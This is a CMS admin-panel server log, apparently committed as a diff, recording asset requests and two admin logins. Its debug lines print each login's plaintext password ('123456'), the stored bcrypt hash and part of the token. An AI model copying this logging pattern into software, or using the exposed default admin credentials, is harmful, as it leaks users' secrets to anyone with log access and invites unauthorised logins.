+2025-07-11 11:39 +08:00: GET /public/admin/assets/svg/ico-will.svg 304 - - 1.725 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/svg/ico-message.svg 304 - - 1.895 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/svg/ico-up.svg 304 - - 2.071 ms
+2025-07-11 11:39 +08:00: GET /cms/article/tongji 304 - - 8.857 ms
+2025-07-11 11:39 +08:00: GET /cms/site/runEnv 304 - - 1.318 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/js/index8.js 200 2834 - 1.125 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/css/dialog5.css 200 784 - 1.639 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/js/dialog5.js 200 4098 - 1.644 ms
+2025-07-11 11:39 +08:00: GET /base/user/list 200 389 - 8.113 ms
+2025-07-11 11:40 +08:00: GET /public/admin/index.html 304 - - 0.582 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/css/element-plus.css 304 - - 1.454 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/index.js 304 - - 0.943 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/css/index.css 304 - - 0.784 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/css/saduo.css 304 - - 0.770 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/@vue.js 304 - - 0.819 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/css/nprogress.css 304 - - 0.840 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/pinia.js 304 - - 0.586 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/dayjs.js 304 - - 1.011 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/lodash-es.js 304 - - 0.967 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/pinia-plugin-persist.js 304 - - 0.950 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/vue-router.js 304 - - 0.932 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/@element-plus.js 304 - - 0.912 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/@popperjs.js 304 - - 1.602 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/normalize-wheel-es.js 304 - - 1.129 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/element-plus.js 304 - - 3.343 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/async-validator.js 304 - - 4.289 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/memoize-one.js 304 - - 4.961 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/@ctrl.js 304 - - 5.604 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/axios.js 304 - - 1.061 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/js-cookie.js 304 - - 0.651 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/nprogress.js 304 - - 0.639 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/index5.js 304 - - 1.392 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/login_log.js 304 - - 1.105 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/css/vue3-puzzle-vcode.css 304 - - 1.124 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/vue3-puzzle-vcode.js 304 - - 1.109 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/css/index2.css 304 - - 1.341 ms
+2025-07-11 11:40 +08:00: GET /public/admin/favicon.png 304 - - 0.327 ms
+2025-07-11 11:40 +08:00: GET /public/admin/favicon.png 304 - - 0.306 ms
+2025-07-11 11:40 +08:00: GET /public/cover/sea/07.png 304 - - 0.562 ms
+2025-07-11 11:40 +08:00: Login attempt: { username: 'chancms' }
+2025-07-11 11:40 +08:00: Direct query result: {
+2025-07-11 11:40 +08:00:   id: 14,
+2025-07-11 11:40 +08:00:   username: 'chancms',
+2025-07-11 11:40 +08:00:   password: '$2a$10$pdygs6uahorxNcAOw7RQC.6KkByPiWdg44oDuBNVWr.zfEcy4FLDS',
+2025-07-11 11:40 +08:00:   status: '0'
+2025-07-11 11:40 +08:00: }
+2025-07-11 11:40 +08:00: User found: { id: 14, username: 'chancms', status: '0' }
+2025-07-11 11:40 +08:00: Comparing passwords...
+2025-07-11 11:40 +08:00: Input password: 123456
+2025-07-11 11:40 +08:00: Stored hash: $2a$10$pdygs6uahorxNcAOw7RQC.6KkByPiWdg44oDuBNVWr.zfEcy4FLDS
+2025-07-11 11:40 +08:00: Password match result: true
+2025-07-11 11:40 +08:00: Login successful, generating token
+2025-07-11 11:40 +08:00: Token generated: { token: 'eyJhbGciOiJIUzI1NiIs...' }
+2025-07-11 11:40 +08:00: Menus retrieved: success
+2025-07-11 11:40 +08:00: Response structure: {
+2025-07-11 11:40 +08:00:   code: 200,
+2025-07-11 11:40 +08:00:   msg: 'success',
+2025-07-11 11:40 +08:00:   data_keys: [ 'status', 'username', 'token' ],
+2025-07-11 11:40 +08:00:   menus_included: true
+2025-07-11 11:40 +08:00: }
+2025-07-11 11:40 +08:00: POST /base/user/login 200 9950 - 63.300 ms
+2025-07-11 11:40 +08:00: 111 { id: 14, username: 'chancms', avatar: '', status: '0' }
+2025-07-11 11:40 +08:00: GET /base/user/detail 200 159 - 6.473 ms
+2025-07-11 11:40 +08:00: GET /cms/loginLog/delete 304 - - 5.118 ms
+2025-07-11 11:40 +08:00: POST /cms/loginLog/create 200 45 - 3.948 ms
+2025-07-11 11:40 +08:00: GET /base/menu/allRouter 200 9727 - 7.724 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/css/dialog5.css 304 - - 0.462 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/index8.js 304 - - 0.484 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/dialog5.js 304 - - 0.625 ms
+2025-07-11 11:40 +08:00: GET /base/user/list 304 - - 3.022 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/index10.js 304 - - 0.974 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/category.js 304 - - 0.940 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/css/index5.css 304 - - 0.931 ms
+2025-07-11 11:40 +08:00: GET /cms/category/search?q= 304 - - 2.864 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/index9.js 304 - - 0.316 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/js/article.js 304 - - 0.472 ms
+2025-07-11 11:40 +08:00: GET /public/admin/assets/css/index4.css 304 - - 0.297 ms
+2025-07-11 11:40 +08:00: GET /cms/article/search?cur=1&pageSize=20&keyword=&cid=0 200 3669 - 3.554 ms
+2025-07-11 11:40 +08:00: GET /cms/category/find 304 - - 3.045 ms
+2025-07-11 11:42 +08:00: GET /public/admin/index.html 304 - - 0.356 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/index.js 304 - - 0.418 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/css/element-plus.css 304 - - 0.528 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/css/index.css 304 - - 1.521 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/css/nprogress.css 304 - - 1.257 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/@vue.js 304 - - 1.217 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/css/saduo.css 304 - - 1.194 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/pinia.js 304 - - 0.372 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/pinia-plugin-persist.js 304 - - 0.527 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/dayjs.js 304 - - 1.755 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/lodash-es.js 304 - - 1.046 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/vue-router.js 304 - - 0.975 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/@element-plus.js 304 - - 1.157 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/@popperjs.js 304 - - 0.525 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/async-validator.js 304 - - 0.406 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/memoize-one.js 304 - - 1.041 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/@ctrl.js 304 - - 1.417 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/element-plus.js 304 - - 1.127 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/normalize-wheel-es.js 304 - - 1.060 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/axios.js 304 - - 0.413 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/js-cookie.js 304 - - 0.414 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/nprogress.js 304 - - 0.336 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/login_log.js 304 - - 2.399 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/css/index2.css 304 - - 1.848 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/css/vue3-puzzle-vcode.css 304 - - 1.787 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/vue3-puzzle-vcode.js 304 - - 1.781 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/index5.js 304 - - 1.182 ms
+2025-07-11 11:42 +08:00: GET /public/admin/favicon.png 304 - - 1.446 ms
+2025-07-11 11:42 +08:00: GET /public/admin/favicon.png 304 - - 0.344 ms
+2025-07-11 11:42 +08:00: GET /public/cover/sea/06.png 304 - - 0.456 ms
+2025-07-11 11:42 +08:00: Login attempt: { username: 'admin' }
+2025-07-11 11:42 +08:00: Direct query result: {
+2025-07-11 11:42 +08:00:   id: 12,
+2025-07-11 11:42 +08:00:   username: 'admin',
+2025-07-11 11:42 +08:00:   password: '$2a$10$pdygs6uahorxNcAOw7RQC.6KkByPiWdg44oDuBNVWr.zfEcy4FLDS',
+2025-07-11 11:42 +08:00:   status: '0'
+2025-07-11 11:42 +08:00: }
+2025-07-11 11:42 +08:00: User found: { id: 12, username: 'admin', status: '0' }
+2025-07-11 11:42 +08:00: Comparing passwords...
+2025-07-11 11:42 +08:00: Input password: 123456
+2025-07-11 11:42 +08:00: Stored hash: $2a$10$pdygs6uahorxNcAOw7RQC.6KkByPiWdg44oDuBNVWr.zfEcy4FLDS
+2025-07-11 11:42 +08:00: Password match result: true
+2025-07-11 11:42 +08:00: Login successful, generating token
+2025-07-11 11:42 +08:00: Token generated: { token: 'eyJhbGciOiJIUzI1NiIs...' }
+2025-07-11 11:42 +08:00: Menus retrieved: success
+2025-07-11 11:42 +08:00: Response structure: {
+2025-07-11 11:42 +08:00:   code: 200,
+2025-07-11 11:42 +08:00:   msg: 'success',
+2025-07-11 11:42 +08:00:   data_keys: [ 'status', 'username', 'token' ],
+2025-07-11 11:42 +08:00:   menus_included: true
+2025-07-11 11:42 +08:00: }
+2025-07-11 11:42 +08:00: POST /base/user/login 200 4206 - 65.868 ms
+2025-07-11 11:42 +08:00: 111 { id: 12, username: 'admin', avatar: '', status: '0' }
+2025-07-11 11:42 +08:00: GET /base/user/detail 200 157 - 8.284 ms
+2025-07-11 11:42 +08:00: GET /cms/loginLog/delete 304 - - 5.157 ms
+2025-07-11 11:42 +08:00: POST /cms/loginLog/create 200 45 - 3.810 ms
+2025-07-11 11:42 +08:00: GET /base/menu/allRouter 200 3988 - 3.425 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/css/index4.css 304 - - 0.375 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/index9.js 304 - - 2.260 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/article.js 304 - - 1.517 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/category.js 304 - - 1.970 ms
+2025-07-11 11:42 +08:00: GET /cms/article/search?cur=1&pageSize=20&keyword=&cid=0 304 - - 2.538 ms
+2025-07-11 11:42 +08:00: GET /cms/category/find 304 - - 1.743 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/css/dialog5.css 304 - - 0.927 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/index8.js 304 - - 0.832 ms
+2025-07-11 11:42 +08:00: GET /public/admin/assets/js/dialog5.js 304 - - 0.400 ms
+2025-07-11 11:42 +08:00: GET /base/user/list 304 - - 3.851 ms
+2025-07-11 11:42 +08:00: GET /base/role/list 200 399 - 3.693 ms
+2025-07-11 11:42 +08:00: GET /base/user/list 304 - - 3.150 ms
+2025-07-11 11:44 +08:00: GET /public/admin/assets/js/friendlink.js 304 - - 0.625 ms
+2025-07-11 11:44 +08:00: GET /public/admin/assets/js/index14.js 304 - - 0.730 ms
+2025-07-11 11:44 +08:00: GET /public/admin/assets/css/edit3.css 304 - - 0.393 ms
+2025-07-11 11:44 +08:00: GET /cms/friendlink/list?cur=1&pageSize=20 304 - - 4.771 ms
+2025-07-11 11:45 +08:00: GET /public/admin/assets/js/index21.js 304 - - 0.343 ms
+2025-07-11 11:45 +08:00: GET /public/admin/assets/css/index9.css 304 - - 0.559 ms
+2025-07-11 11:45 +08:00: GET /public/admin/assets/js/tag.js 304 - - 0.606 ms
+2025-07-11 11:45 +08:00: GET /cms/tag/search?cur=1&pageSize=10&keyword= 304 - - 5.148 ms
